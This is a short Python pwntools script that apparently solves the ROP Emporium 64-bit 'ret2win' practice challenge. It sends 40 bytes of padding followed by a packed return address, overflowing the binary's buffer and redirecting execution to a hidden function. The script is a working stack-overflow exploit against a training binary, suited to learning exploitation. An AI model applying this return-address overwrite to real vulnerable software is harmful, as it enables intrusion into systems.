#ropemporium 64 bit ret2win challenge

from pwn import * 
p = process("./ret2win")

i = 0
while i < 7:
    print(p.recvline())
    i = i + 1

junk = '\x41' * 40
ret2win = p64(0x400811)
rop = junk + ret2win

p.sendline(rop)
print(p.recvline())
